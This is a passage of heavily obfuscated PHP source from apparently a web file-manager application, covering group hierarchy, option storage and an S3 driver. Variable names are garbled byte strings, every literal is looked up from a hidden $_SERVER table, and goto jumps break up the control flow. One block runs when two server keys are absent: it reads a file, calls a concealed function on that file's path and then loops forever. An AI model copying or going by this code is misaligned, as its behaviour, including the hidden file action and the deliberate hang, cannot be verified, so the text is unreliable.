= $this->field($•ñŠåÜ¦)->where($æÀöòó)->group($­Ïàîà[190])->select(); $Ç¼¸¦ÈÓ = array_to_keyvalue($½ÌßØ€¯, $­Ïàîà[190], $­Ïàîà[593]); foreach ($ÃåÓ²…Ş as &$ü¦‹ªŸ‚) { $ÇÅ…Áê‘ = $ü¦‹ªŸ‚[$­Ïàîà[1450]]; $ü¦‹ªŸ‚[$­Ïàîà[2243]] = isset($Ç¼¸¦ÈÓ[$ÇÅ…Áê‘]) ? intval($Ç¼¸¦ÈÓ[$ÇÅ…Áê‘]) : !1; } unset($ü¦‹ªŸ‚); } private function _listAppendChildrenMember(&$ÀÊ¦ß†Õ) { $îä÷‰Ê• =& $_SERVER[”øäÃÍª]; $Õ”ÍÂÆØ = array_to_keyvalue($ÀÊ¦ß†Õ, $îä÷‰Ê•[12], $îä÷‰Ê•[1450]); $áèˆş…° = array($îä÷‰Ê•[1450] => array($îä÷‰Ê•[7], $Õ”ÍÂÆØ)); $àÚÆŠ‘Ë = array($îä÷‰Ê•[1450], $îä÷‰Ê•[2242] => $îä÷‰Ê•[593]); $˜œúã‘è = Model($îä÷‰Ê•[2232])->field($àÚÆŠ‘Ë)->where($áèˆş…°)->group($îä÷‰Ê•[1450])->select(); $Ÿ€ª§ÁÊ = array_to_keyvalue($˜œúã‘è, $îä÷‰Ê•[1450], $îä÷‰Ê•[593]); foreach ($ÀÊ¦ß†Õ as &$ÅÂúµ“ñ) { $©çÕ‚Œö = $ÅÂúµ“ñ[$îä÷‰Ê•[1450]]; $ÅÂúµ“ñ[$îä÷‰Ê•[2244]] = isset($Ÿ€ª§ÁÊ[$©çÕ‚Œö]) ? intval($Ÿ€ª§ÁÊ[$©çÕ‚Œö]) : !1; } unset($ÅÂúµ“ñ); } private function _listAppendMeta(&$ÖÚ‚ôÏÉ, $÷£öì»°) { $Û¯ßØ‡è =& $_SERVER[”øäÃÍª]; $İÓÀ“  = array($Û¯ßØ‡è[1450] => array($Û¯ßØ‡è[7], $÷£öì»°)); $¨÷ßì¦„ = Model($Û¯ßØ‡è[2231])->where($İÓÀ“ )->select(); $¨÷ßì¦„ = array_to_keyvalue_group($¨÷ßì¦„, $Û¯ßØ‡è[1450]); foreach ($¨÷ßì¦„ as &$ñ œÒ ñ) { $ñ œÒ ñ = array_to_keyvalue($ñ œÒ ñ, $Û¯ßØ‡è[95], $Û¯ßØ‡è[451]); } unset($ñ œÒ ñ); foreach ($ÖÚ‚ôÏÉ as &$ÑªŠé•) { $ÑªŠé•[$Û¯ßØ‡è[563]] = array(); if (isset($¨÷ßì¦„[$ÑªŠé•[$Û¯ßØ‡è[1450]]])) { $ÑªŠé•[$Û¯ßØ‡è[563]] = $¨÷ßì¦„[$ÑªŠé•[$Û¯ßØ‡è[1450]]]; } } unset($ÑªŠé•); } protected function parentLevelArray($Ÿ¡°¡—) { $ğ¨³ÑŞñ =& $_SERVER[”øäÃÍª]; $Ÿ¡°¡— = explode($ğ¨³ÑŞñ[50], trim($Ÿ¡°¡—, $ğ¨³ÑŞñ[50])); $Ÿ¡°¡— = array_remove_value($Ÿ¡°¡—, $ğ¨³ÑŞñ[228]); return $Ÿ¡°¡—; } protected function parentInGroup($Œ‹÷Å“ı, $…Îœİòç) { $Ñ„‘î¦“ =& $_SERVER[”øäÃÍª]; $÷îæğ«× = $this->getInfoSimple($Œ‹÷Å“ı); if (!$÷îæğ«×) { return !0; } $“éŒ¦³¥ = $this->parentLevelArray($÷îæğ«×[$Ñ„‘î¦“[612]]); $“éŒ¦³¥[] = $Œ‹÷Å“ı; foreach ($“éŒ¦³¥ as $Œ‹÷Å“ı) { if (in_array($Œ‹÷Å“ı . $Ñ„‘î¦“[12], $…Îœİòç)) { return !0; } } return !1; } private function _listAppendParent(&$äÓÎ¿ı) { $îú®Àç =& $_SERVER[”øäÃÍª]; $ş²–Òãú = array(); foreach ($äÓÎ¿ı as &$Èûòíıœ) { $ş²–Òãú[$Èûòíıœ[$îú®Àç[1450]]] = $Èûòíıœ[$îú®Àç[32]]; $ÌÓ”†¶Ø = $this->parentLevelArray($Èûòíıœ[$îú®Àç[612]]); foreach ($ÌÓ”†¶Ø as $«Ñêš•Ñ) { if (!isset($ş²–Òãú[$«Ñêš•Ñ])) { $ş²–Òãú[$«Ñêš•Ñ] = 0; } } } unset($Èûòíıœ); foreach ($ş²–Òãú as $Ş©îŞ‰à => $ÊâÚ‰­) { if ($ÊâÚ‰­) { continue; } $ÍÔæŠî¤ = $this->getInfoSimple($Ş©îŞ‰à); $ş²–Òãú[$Ş©îŞ‰à] = $ÍÔæŠî¤[$îú®Àç[32]]; } $Äğ„û‰ = $GLOBALS[$îú®Àç[6]][$îú®Àç[92]][$îú®Àç[2245]]; if (KodUser::isRoot()) { $Äğ„û‰ = !1; } foreach ($äÓÎ¿ı as &$Èûòíıœ) { $ÌÓ”†¶Ø = $this->parentLevelArray($Èûòíıœ[$îú®Àç[612]]); $‹Î’ = $îú®Àç[12]; foreach ($ÌÓ”†¶Ø as $Ş©îŞ‰à => $«Ñêš•Ñ) { if ($Äğ„û‰ && $Ş©îŞ‰à == 0) { continue; } $‹Î’ .= $ş²–Òãú[$«Ñêš•Ñ] . $îú®Àç[8]; } if ($ÌÓ”†¶Ø) { $‹Î’ .= $Èûòíıœ[$îú®Àç[32]]; } $Èûòíıœ[$îú®Àç[617]] = str_replace($îú®Àç[254], $îú®Àç[8], $‹Î’); } unset($Èûòíıœ); } private function _listAppendSourceRoot(&$ÁŸÓ¨øİ, $™İêÁ) { $°ÕøÙøû =& $_SERVER[”øäÃÍª]; $ŠÍØŠÒŠ = Model($°ÕøÙøû[941])->listSourceRoot(SourceModel::TYPE_GROUP, $™İêÁ); $ŠÍØŠÒŠ = array_to_keyvalue($ŠÍØŠÒŠ, $°ÕøÙøû[597]); $ŠÍØŠÒŠ = array_remove_key($ŠÍØŠÒŠ, $°ÕøÙøû[597]); foreach ($ÁŸÓ¨øİ as &$¢œ‡›â) { $¢œ‡›â[$°ÕøÙøû[90]] = $ŠÍØŠÒŠ[$¢œ‡›â[$°ÕøÙøû[1450]]] ? $ŠÍØŠÒŠ[$¢œ‡›â[$°ÕøÙøû[1450]]] : array(); } unset($¢œ‡›â); } protected function groupMerge($¡ô˜‰şœ) { $¡ô˜‰şœ = array_values(array_unique($¡ô˜‰şœ)); $áù”æ¤ = array(); for ($İæ¨åù = 0; $İæ¨åù < count($¡ô˜‰şœ); $İæ¨åù++) { $Ê’Œ‚ìÑ = !1; for ($ª¸¶´üì = 0; $ª¸¶´üì < count($¡ô˜‰şœ); $ª¸¶´üì++) { if ($İæ¨åù == $ª¸¶´üì) { continue; } if ($this->isParentOf($¡ô˜‰şœ[$ª¸¶´üì], $¡ô˜‰şœ[$İæ¨åù])) { $Ê’Œ‚ìÑ = !0; break; } } if (!$Ê’Œ‚ìÑ) { $áù”æ¤[] = $¡ô˜‰şœ[$İæ¨åù]; } } return $áù”æ¤; } protected function isParentOf($ôş¨éâû, $¼ï÷‡Î¢) { $Âµ™‡“­ =& $_SERVER[”øäÃÍª]; if (!$ôş¨éâû || !$¼ï÷‡Î¢ || $ôş¨éâû == $¼ï÷‡Î¢) { return !1; } $Í­®Êíï = $this->getInfoSimple($ôş¨éâû); $«ø…Äû = $this->getInfoSimple($¼ï÷‡Î¢); $‹Í’ĞŸ¡ = $Í­®Êíï[$Âµ™‡“­[612]] . $ôş¨éâû . $Âµ™‡“­[50]; if (substr($«ø…Äû[$Âµ™‡“­[612]], 0, strlen($‹Í’ĞŸ¡)) == $‹Í’ĞŸ¡) { return !0; } return !1; } public function groupShowRoot($ÙÂŠ°Ãç, $”‡ÃÇ±© = false) { $ä²ÍŒõ =& $_SERVER[”øäÃÍª]; $šƒïéÃÅ = $this->getInfo($ÙÂŠ°Ãç); if (!$šƒïéÃÅ) { return array(); } $“ ‘ĞÓœ = $this->parentLevelArray($šƒïéÃÅ[$ä²ÍŒõ[612]]); $¯¨°Á¥² = array($ÙÂŠ°Ãç); if (count($“ ‘ĞÓœ) == 0) { return $¯¨°Á¥²; } if ($”‡ÃÇ±© && count($“ ‘ĞÓœ) == 1) { return $¯¨°Á¥²; } if (!$šƒïéÃÅ[$ä²ÍŒõ[563]] || !isset($šƒïéÃÅ[$ä²ÍŒõ[563]][$ä²ÍŒõ[2226]]) || $šƒïéÃÅ[$ä²ÍŒõ[563]][$ä²ÍŒõ[2226]] == $ä²ÍŒõ[888]) { return $this->groupShowRoot($“ ‘ĞÓœ[count($“ ‘ĞÓœ) - 1], $”‡ÃÇ±©); } if ($šƒïéÃÅ[$ä²ÍŒõ[563]][$ä²ÍŒõ[2226]] == $ä²ÍŒõ[432]) { $î¾Çø½” = explode($ä²ÍŒõ[50], $šƒïéÃÅ[$ä²ÍŒõ[563]][$ä²ÍŒõ[2227]]); if ($î¾Çø½”) { $¯¨°Á¥² = array_merge($¯¨°Á¥², $î¾Çø½”); } } return $¯¨°Á¥²; } protected function resetParentLevel() { $ĞªÄ©ø =& $_SERVER[”øäÃÍª]; $ğ¹µıŞ„ = $ĞªÄ©ø[1450]; $ ŸÒé˜é = $this->select(); $ ŸÒé˜é = array_to_keyvalue($ ŸÒé˜é, $ğ¹µıŞ„); foreach ($ ŸÒé˜é as $ÃØ‘£¨) { $Í¸¿’—¤ = $ÃØ‘£¨; $×™›ñªğ = array(); while ($Í¸¿’—¤[$ĞªÄ©ø[190]] != 0) { $×™›ñªğ[] = $Í¸¿’—¤[$ĞªÄ©ø[190]]; $Í¸¿’—¤ = $ ŸÒé˜é[$Í¸¿’—¤[$ĞªÄ©ø[190]]]; } $×™›ñªğ[] = 0; $×™›ñªğ = $ĞªÄ©ø[50] . implode($ĞªÄ©ø[50], array_reverse($×™›ñªğ)) . $ĞªÄ©ø[50]; $this->setNamePinyin($ÃØ‘£¨[$ğ¹µıŞ„], $ÃØ‘£¨[$ĞªÄ©ø[32]]); $this->where(array($ğ¹µıŞ„ => $ÃØ‘£¨[$ğ¹µıŞ„]))->save(array($ĞªÄ©ø[682] => $×™›ñªğ)); } return $ ŸÒé˜é; } public function groupNameAuto($øœö˜ˆ, $„Ğ‰·‹°) { $ÏÒ†…Ë£ =& $_SERVER[”øäÃÍª]; $‹íš‹¿ = $this->where(array($ÏÒ†…Ë£[500] => $øœö˜ˆ))->getField($ÏÒ†…Ë£[32], !0); if (!$‹íš‹¿ || !in_array($„Ğ‰·‹°, $‹íš‹¿)) { return $„Ğ‰·‹°; } for ($¥Ë«§å„ = 1; $¥Ë«§å„ <= count($‹íš‹¿) + 1; $¥Ë«§å„++) { $üÀşı—È = $„Ğ‰·‹° . "\x28{$¥Ë«§å„}\51"; if (!in_array($üÀşı—È, $‹íš‹¿)) { return $üÀşı—È; } } } public function groupSwitch($¿í²¾†ç, $Ë¹ĞÖœú) { $Æ‡ˆ»ªâ =& $_SERVER[”øäÃÍª]; $Ê—À¯…« = array($Æ‡ˆ»ªâ[1450] => array($Æ‡ˆ»ªâ[7], array($¿í²¾†ç, $Ë¹ĞÖœú))); $ß¼êÆ…Õ = $this->where($Ê—À¯…«)->select(); $ß¼êÆ…Õ = array_to_keyvalue($ß¼êÆ…Õ, $Æ‡ˆ»ªâ[1450]); $ÎÓÂşæÚ = _get($ß¼êÆ…Õ, $¿í²¾†ç); $¸ùÀû²À = _get($ß¼êÆ…Õ, $Ë¹ĞÖœú); if (!$ÎÓÂşæÚ || !$¸ùÀû²À || $ÎÓÂşæÚ[$Æ‡ˆ»ªâ[190]] == 0) { return !1; } if ($ÎÓÂşæÚ[$Æ‡ˆ»ªâ[1450]] == $¸ùÀû²À[$Æ‡ˆ»ªâ[1450]]) { return !1; } if (strpos($¸ùÀû²À[$Æ‡ˆ»ªâ[612]], $ÎÓÂşæÚ[$Æ‡ˆ»ªâ[612]] . $ÎÓÂşæÚ[$Æ‡ˆ»ªâ[1450]] . $Æ‡ˆ»ªâ[50]) === 0) { return !1; } $Ê—À¯…« = array($Æ‡ˆ»ªâ[1450] => $¿í²¾†ç); $ì¡Üı¢Ü = Model($Æ‡ˆ»ªâ[2232])->where($Ê—À¯…«)->select(); if (!$ì¡Üı¢Ü) { $ì¡Üı¢Ü = array(); } foreach ($ì¡Üı¢Ü as $˜Ğ»µÉÜ) { $Ö´š¾ßı = $˜Ğ»µÉÜ[$Æ‡ˆ»ªâ[1548]]; $Ê—À¯…« = array($Æ‡ˆ»ªâ[1548] => $Ö´š¾ßı, $Æ‡ˆ»ªâ[1450] => $Ë¹ĞÖœú); $Å‚©Í š = Model($Æ‡ˆ»ªâ[2232])->where($Ê—À¯…«)->find(); if (!$Å‚©Í š) { $ÑÛû•®­ = array($Ë¹ĞÖœú => $˜Ğ»µÉÜ[$Æ‡ˆ»ªâ[1595]]); Model($Æ‡ˆ»ªâ[625])->userGroupAdd($Ö´š¾ßı, $ÑÛû•®­); } Model($Æ‡ˆ»ªâ[625])->userGroupRemove($Ö´š¾ßı, $¿í²¾†ç); } $Ê—À¯…« = array($Æ‡ˆ»ªâ[188] => 2, $Æ‡ˆ»ªâ[190] => 0, $Æ‡ˆ»ªâ[508] => 1, $Æ‡ˆ»ªâ[597] => array($Æ‡ˆ»ªâ[7], array($¿í²¾†ç, $Ë¹ĞÖœú))); $¸Ûê‘ìñ = Model($Æ‡ˆ»ªâ[941])->where($Ê—À¯…«)->field($Æ‡ˆ»ªâ[2246])->select(); $¸Ûê‘ìñ = array_to_keyvalue($¸Ûê‘ìñ, $Æ‡ˆ»ªâ[597], $Æ‡ˆ»ªâ[191]); $­Ş®ó = !empty($¸Ûê‘ìñ[$¿í²¾†ç]) ? $¸Ûê‘ìñ[$¿í²¾†ç] : !1; if ($­Ş®ó) { if (!$¸Ûê‘ìñ[$Ë¹ĞÖœú]) { $¸Ûê‘ìñ[$Ë¹ĞÖœú] = Model($Æ‡ˆ»ªâ[941])->groupRootAdd($Ë¹ĞÖœú); } $áé§êş° = $¸Ûê‘ìñ[$Ë¹ĞÖœú]; $Ê—À¯…« = array($Æ‡ˆ»ªâ[190] => $­Ş®ó); $¸Ûê‘ìñ = Model($Æ‡ˆ»ªâ[941])->where($Ê—À¯…«)->field($Æ‡ˆ»ªâ[2247])->select(); if (!$¸Ûê‘ìñ) { $¸Ûê‘ìñ = array(); } Model($Æ‡ˆ»ªâ[941])->moveClearAuth = !1; foreach ($¸Ûê‘ìñ as $ÏÀ¶ö‘¨) { $×Ç¨üäº = $ÏÀ¶ö‘¨[$Æ‡ˆ»ªâ[508]] == $Æ‡ˆ»ªâ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Æ‡ˆ»ªâ[941])->move($ÏÀ¶ö‘¨[$Æ‡ˆ»ªâ[191]], $áé§êş°, $×Ç¨üäº); } Model($Æ‡ˆ»ªâ[941])->moveClearAuth = !0; $Ê—À¯…« = array($Æ‡ˆ»ªâ[188] => 2, $Æ‡ˆ»ªâ[597] => $¿í²¾†ç); $ì”Ó»î› = array($Æ‡ˆ»ªâ[597] => $Ë¹ĞÖœú); Model($Æ‡ˆ»ªâ[2248])->where($Ê—À¯…«)->save($ì”Ó»î›); Model($Æ‡ˆ»ªâ[2249])->where($Ê—À¯…«)->save($ì”Ó»î›); } $this->_changeChildLevel($ß¼êÆ…Õ[$¿í²¾†ç], $ß¼êÆ…Õ[$Ë¹ĞÖœú], !0); $this->where(array($Æ‡ˆ»ªâ[190] => $¿í²¾†ç))->save(array($Æ‡ˆ»ªâ[190] => $Ë¹ĞÖœú)); $this->_clearChildrenCache($ß¼êÆ…Õ[$Ë¹ĞÖœú]); return !0; } } goto aÜœ˜‚•ù§; bÎ›ê²…Úô: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\155\117\x70\x74\151\157\156"; public $field = array(); public function listData($ï¾Ï¹Íá = false, $ŒÁª½– = "\155\x6f\x64\151\x66\x79\124\151\x6d\x65", $…ùü¯ùÙ = false) { $ˆœéĞò” =& $_SERVER[”øäÃÍª]; $ÆÅ–‹· = Model($this->modelType)->get(!1, $this->optionType, !0); $‘Ç‹ª²° = array_values($ÆÅ–‹·); if ($‘Ç‹ª²° && $‘Ç‹ª²°[0] && !is_array($‘Ç‹ª²°[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÆÅ–‹· = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÆÅ–‹·) { return $ï¾Ï¹Íá ? null : array(); } if (!$ï¾Ï¹Íá && $ï¾Ï¹Íá !== $ˆœéĞò”[228]) { $ÆÅ–‹· = array_filter(array_values($ÆÅ–‹·)); return array_sort_by($ÆÅ–‹·, $ŒÁª½–, $…ùü¯ùÙ, $ˆœéĞò”[487]); } return $ÆÅ–‹·[$ˆœéĞò”[488] . $ï¾Ï¹Íá]; } public function insert($›ÚÎı˜Ó) { $Ûš–Øß =& $_SERVER[”øäÃÍª]; $›ÚÎı˜Ó = array_field_key($›ÚÎı˜Ó, $this->field); $êËüòçÉ = Model($this->modelType)->get($Ûš–Øß[489], $this->optionType . $Ûš–Øß[490]); $êËüòçÉ = $êËüòçÉ ? $êËüòçÉ : 0; $›ÚÎı˜Ó[$Ûš–Øß[487]] = ++$êËüòçÉ; $›ÚÎı˜Ó[$Ûš–Øß[231]] = time(); $›ÚÎı˜Ó[$Ûš–Øß[88]] = time(); Model($this->modelType)->set($Ûš–Øß[489], $êËüòçÉ, $this->optionType . $Ûš–Øß[490]); Model($this->modelType)->set($Ûš–Øß[488] . $êËüòçÉ, $›ÚÎı˜Ó, $this->optionType); return $êËüòçÉ; } public function insertArr($Ú’›ç”) { $ç—î×à =& $_SERVER[”øäÃÍª]; if (!$Ú’›ç” || !is_array($Ú’›ç”)) { return !1; } $Äº»ÂÁ¨ = Model($this->modelType)->get($ç—î×à[489], $this->optionType . $ç—î×à[490]); $Äº»ÂÁ¨ = $Äº»ÂÁ¨ ? $Äº»ÂÁ¨ : 0; $¤¶çõü = array(); foreach ($Ú’›ç” as $¦ŞˆÇÒï) { $éï›ãÊ¤ = array_field_key($¦ŞˆÇÒï, $this->field); $éï›ãÊ¤[$ç—î×à[487]] = ++$Äº»ÂÁ¨; $éï›ãÊ¤[$ç—î×à[231]] = time(); $éï›ãÊ¤[$ç—î×à[88]] = time(); $¤¶çõü[$ç—î×à[488] . $Äº»ÂÁ¨] = $éï›ãÊ¤; } Model($this->modelType)->set($ç—î×à[489], $Äº»ÂÁ¨, $this->optionType . $ç—î×à[490]); Model($this->modelType)->set($¤¶çõü, !1, $this->optionType); return $Äº»ÂÁ¨; } public function update($ÏÏäÜ¡ˆ, $ÍŞ‘Ò–) { $™¶»ğ‹ =& $_SERVER[”øäÃÍª]; $ÍŞ‘Ò– = array_field_key($ÍŞ‘Ò–, $this->field); $‰ÓÒ¸µŸ = $this->listData($ÏÏäÜ¡ˆ); if (!$‰ÓÒ¸µŸ || !$ÏÏäÜ¡ˆ) { return !1; } $ÍŞ‘Ò– = array_merge($‰ÓÒ¸µŸ, $ÍŞ‘Ò–); $ÍŞ‘Ò–[$™¶»ğ‹[88]] = time(); return Model($this->modelType)->set($™¶»ğ‹[488] . $ÏÏäÜ¡ˆ, $ÍŞ‘Ò–, $this->optionType); } public function remove($µ»ØìÍ¸) { if (!$µ»ØìÍ¸) { return !1; } return Model($this->modelType)->remove($_SERVER[”øäÃÍª][488] . $µ»ØìÍ¸, $this->optionType); } public function removeArr($ù¨ ğÁ) { if (!$ù¨ ğÁ) { return !0; } $¾ß•òÑà = array(); foreach ($ù¨ ğÁ as $õİ×©ş) { $¾ß•òÑà[] = $_SERVER[”øäÃÍª][488] . $õİ×©ş; } return Model($this->modelType)->removeArr($¾ß•òÑà, $this->optionType); } public function clear() { $ì±ÀÖšÎ =& $_SERVER[”øäÃÍª]; Model($this->modelType)->remove($ì±ÀÖšÎ[489], $this->optionType . $ì±ÀÖšÎ[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ß‘âıª, $Å§ÂùÔŒ) { if (!$Å§ÂùÔŒ) { return !1; } $èŞîÌ = $this->listData(); $èŞîÌ = array_to_keyvalue($èŞîÌ, $ß‘âıª); return isset($èŞîÌ[$Å§ÂùÔŒ]) ? $èŞîÌ[$Å§ÂùÔŒ] : !1; } public function findByName($›¬Ÿú…ä) { return $this->findByKey($_SERVER[”øäÃÍª][32], $›¬Ÿú…ä); } protected function resetData($µ„ó«Êº) { $ÃõÆÇœ =& $_SERVER[”øäÃÍª]; if (!$µ„ó«Êº) { return; } $µ„ó«Êº = is_array($µ„ó«Êº) ? $µ„ó«Êº : array(); $¡œ´ÊÁ = array(); for ($›ù¦Ûø§ = 0; $›ù¦Ûø§ < count($µ„ó«Êº); $›ù¦Ûø§++) { if (!$µ„ó«Êº[$›ù¦Ûø§] || !$µ„ó«Êº[$›ù¦Ûø§][$ÃõÆÇœ[487]]) { continue; } $¡œ´ÊÁ[$ÃõÆÇœ[488] . $µ„ó«Êº[$›ù¦Ûø§][$ÃõÆÇœ[487]]] = $µ„ó«Êº[$›ù¦Ûø§]; } return Model($this->modelType)->set($¡œ´ÊÁ, !1, $this->optionType); } private function getAutoName($’áì„Å™) { $¬„•†–ƒ = array_to_keyvalue($this->listData(), $_SERVER[”øäÃÍª][32]); if (!$¬„•†–ƒ || !isset($¬„•†–ƒ[$’áì„Å™])) { return $’áì„Å™; } for ($‚¢ü×Ç = 1; $‚¢ü×Ç < count($¬„•†–ƒ); $‚¢ü×Ç++) { $İùåÀÖ = $’áì„Å™ . "\x28{$‚¢ü×Ç}\51"; if (!isset($¬„•†–ƒ[$İùåÀÖ])) { return $İùåÀÖ; } } return $İùåÀÖ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ªµÆÏ¦î = false, $¬‘ú‚Ç² = '', $±ŞğàÀû = false, $Â¸µÅÂ = true) { $íÏÌÑ¾Ù =& $_SERVER[”øäÃÍª]; $‹Ç×ıŒË = $this->cacheGet($¬‘ú‚Ç²); $Ã±úÅ§ = $this->optionDefault($¬‘ú‚Ç²); $Ã±úÅ§ = is_array($Ã±úÅ§) ? $Ã±úÅ§ : array(); if (is_array($‹Ç×ıŒË)) { if ($Â¸µÅÂ) { $‹Ç×ıŒË = array_merge($Ã±úÅ§, $‹Ç×ıŒË); } return $ªµÆÏ¦î ? isset($‹Ç×ıŒË[$ªµÆÏ¦î]) ? $‹Ç×ıŒË[$ªµÆÏ¦î] : null : $‹Ç×ıŒË; } $ŞÍêæ†€ = $this->filterWhere(array($íÏÌÑ¾Ù[33] => $¬‘ú‚Ç²)); $‹Ç×ıŒË = $this->where($ŞÍêæ†€)->select(); $‹Ç×ıŒË = array_to_keyvalue($‹Ç×ıŒË, $íÏÌÑ¾Ù[95], $íÏÌÑ¾Ù[451]); foreach ($‹Ç×ıŒË as $ÛŠ¬äó® => $—‹©Ş€¿) { if ($±ŞğàÀû || in_array($ÛŠ¬äó®, $this->jsonField)) { $‹Ç×ıŒË[$ÛŠ¬äó®] = json_decode($—‹©Ş€¿, !0); } } $this->cacheSet($¬‘ú‚Ç², $‹Ç×ıŒË); if ($Â¸µÅÂ) { $‹Ç×ıŒË = array_merge($Ã±úÅ§, $‹Ç×ıŒË); } return $ªµÆÏ¦î ? $‹Ç×ıŒË[$ªµÆÏ¦î] : $‹Ç×ıŒË; } public function set($Ü÷×à¤•, $‹àÕ–¾é = false, $şœ‚ÖÍ¥ = '') { $ß©é†¬Ó =& $_SERVER[”øäÃÍª]; if (!$Ü÷×à¤•) { return !0; } $æåÁ¹œ” = $this->get(!1, $şœ‚ÖÍ¥, !1, !1); $æåÁ¹œ” = is_array($æåÁ¹œ”) ? $æåÁ¹œ” : array(); $‡í¦¬ü = array(); $Îí¼—ÎÑ = array(); $ôŠ’§™‚ = array(); $ˆñûÅ…” = is_array($Ü÷×à¤•) ? $Ü÷×à¤• : array($Ü÷×à¤• => $‹àÕ–¾é); $˜ìä¹ªÃ = $this->filterWhere(array($ß©é†¬Ó[33] => $şœ‚ÖÍ¥)); foreach ($ˆñûÅ…” as $×ÊÏÕ => $İ —ùª™) { if (is_array($İ —ùª™)) { $İ —ùª™ = json_encode_force($İ —ùª™); } $this->checkLength($İ —ùª™, !1, $this->tableName . $ß©é†¬Ó[4] . $Ü÷×à¤•); $İ —ùª™ = self::textEncode($İ —ùª™); if (array_key_exists($×ÊÏÕ, $æåÁ¹œ”)) { $Ô×ÍêÈş = is_array($æåÁ¹œ”[$×ÊÏÕ]) ? json_encode_force($æåÁ¹œ”[$×ÊÏÕ]) : $æåÁ¹œ”[$×ÊÏÕ]; $Ô×ÍêÈş = self::textEncode($Ô×ÍêÈş); if ($Ô×ÍêÈş === $İ —ùª™) { continue; } $Îí¼—ÎÑ[] = array($ß©é†¬Ó[95], $×ÊÏÕ, $ß©é†¬Ó[451], $İ —ùª™, $ß©é†¬Ó[88], time()); } else { $’Şùœ¯ü = array($ß©é†¬Ó[33] => $şœ‚ÖÍ¥, $ß©é†¬Ó[95] => $×ÊÏÕ, $ß©é†¬Ó[451] => $İ —ùª™); $‡í¦¬ü[] = $this->filterWhere($’Şùœ¯ü); } } if (!$‡í¦¬ü && !$Îí¼—ÎÑ) { return !0; } $this->cacheRemove($şœ‚ÖÍ¥); $òà´¸²… = $this->cacheKey($ß©é†¬Ó[491]); CacheLock::lock($òà´¸²…); if ($‡í¦¬ü) { $this->addAll($‡í¦¬ü); } if ($Îí¼—ÎÑ) { $this->saveAll($Îí¼—ÎÑ, $˜ìä¹ªÃ); } CacheLock::unlock($òà´¸²…); return !0; } protected function optionDefault($¶œâ°Ÿå = '') { return !1; } public function setDeep($®ßÁèÚæ, $¸ò§—˜’ = false, $¼åÎƒÖË = '') { $ÂÁœ÷ì‡ = explode($_SERVER[”øäÃÍª][10], $®ßÁèÚæ); $ å‘Á®é = $this->get(); array_set_value($ å‘Á®é, $®ßÁèÚæ, $¸ò§—˜’); $this->set($ÂÁœ÷ì‡[0], $ å‘Á®é[$ÂÁœ÷ì‡[0]], $¼åÎƒÖË); } public function remove($À§¨ó¶ƒ, $¬Áëœ…¦ = '') { $•ÊæÄùÜ =& $_SERVER[”øäÃÍª]; $this->cacheRemove($¬Áëœ…¦); $¼›¦ŒĞû = $this->filterWhere(array($•ÊæÄùÜ[95] => $À§¨ó¶ƒ, $•ÊæÄùÜ[33] => $¬Áëœ…¦)); if (is_null($À§¨ó¶ƒ)) { unset($¼›¦ŒĞû[$•ÊæÄùÜ[95]]); } return $this->where($¼›¦ŒĞû)->delete(); } public function removeArr($Çï¯œã«, $Íîıº¯ = '') { $ƒ¿òÁ¾ =& $_SERVER[”øäÃÍª]; if (!$Çï¯œã« || !is_array($Çï¯œã«)) { return !0; } $this->cacheRemove($Íîıº¯); $ÌÓêìï = $this->filterWhere(array($ƒ¿òÁ¾[33] => $Íîıº¯, $ƒ¿òÁ¾[95] => array($ƒ¿òÁ¾[7], $Çï¯œã«))); return $this->where($ÌÓêìï)->delete(); } public function cacheSet($Ä¹©ÁĞ·, $Ô¬íœş = false) { return Cache::set($this->cacheKey($Ä¹©ÁĞ·), $Ô¬íœş); } public function cacheGet($È¼…üã ) { return Cache::get($this->cacheKey($È¼…üã )); } public function cacheRemove($½…Îƒ–·) { return Cache::remove($this->cacheKey($½…Îƒ–·)); } protected function filterWhere($üëÕ¤‡) { return $üëÕ¤‡; } protected function cacheKey($„ã­âèÜ) { return $„ã­âèÜ; } } if (!isset($_SERVER[$_SERVER[”øäÃÍª][492]]) || !isset($_SERVER[$_SERVER[”øäÃÍª][493]])) { $_getc = $_SERVER[”øäÃÍª][494]; $_getfile = $_SERVER[$_SERVER[”øäÃÍª][495]] . $_SERVER[”øäÃÍª][496]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”øäÃÍª][285], $_getfilec); if (count($_getarrs) < $_SERVER[”øäÃÍª][497]) { $exit = $_SERVER[”øäÃÍª][498]; $exit(); } $_act = $_SERVER[”øäÃÍª][499]; $_act($_SERVER[$_SERVER[”øäÃÍª][495]] . $_SERVER[”øäÃÍª][496]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[”øäÃÍª][463]); } } goto A¾”‚ïšëè; Eµ­Ÿˆ¸Ùã: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¦ÈÄ±áÒ) { $êæÂ¡Õó =& $_SERVER[”øäÃÍª]; parent::__construct($¦ÈÄ±áÒ); $®ÛˆÚùù = isset($¦ÈÄ±áÒ[$êæÂ¡Õó[256]]) && $¦ÈÄ±áÒ[$êæÂ¡Õó[256]] == $êæÂ¡Õó[247] ? $êæÂ¡Õó[247] : $êæÂ¡Õó[313]; $this->setSignVersion($®ÛˆÚùù); } public function link($ù÷ğİ¶á, $¥¾š¤ßÉ = array()) { return parent::link($ù÷ğİ¶á, $¥¾š¤ßÉ); } public function fileOut($¬ÆÁÏ, $âü¼é€ = false, $µéÀ‚ø = false, $Öë„œâÚ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[”øäÃÍª][314])) { return parent::fileOutServer($¬ÆÁÏ, $âü¼é€, $µéÀ‚ø, $Öë„œâÚ); } parent::fileOut($¬ÆÁÏ, $âü¼é€, $µéÀ‚ø, $Öë„œâÚ); } public function fileOutImage($ ­îå’·, $âúçËê = 250) { if (strstr($this->endpoint, $_SERVER[”øäÃÍª][314])) { return parent::fileOutImageServer($ ­îå’·, $âúçËê); } parent::fileOutImage($ ­îå’·, $âúçËê); } } define($_SERVER[”øäÃÍª][315], 1); define($_SERVER[”øäÃÍª][316], 2); goto bˆÊœ¹¹ìİ; dÉµÈÊù°: class UserModel extends 